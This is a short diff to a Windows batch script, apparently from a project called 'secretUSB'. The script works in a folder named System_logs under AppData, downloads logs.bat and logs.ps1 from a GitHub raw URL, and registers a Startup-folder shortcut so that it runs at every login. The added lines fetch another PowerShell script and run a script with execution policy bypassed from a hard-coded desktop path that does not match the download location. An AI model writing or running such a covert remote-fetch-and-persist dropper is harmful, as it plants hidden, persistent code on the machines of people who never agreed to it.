@@ -89,6 +89,9 @@ cd %USERPROFILE%\AppData\Roaming\System_logs
 
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.bat
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.ps1
+curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/raccourci.ps1
+
+powershell.exe -ExecutionPolicy Bypass -File C:\Users\Val\Desktop\raccourci.ps1
 
 
 powershell.exe -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\%~logs.lnk');$s.TargetPath='%~logs.bat';$s.Save()"
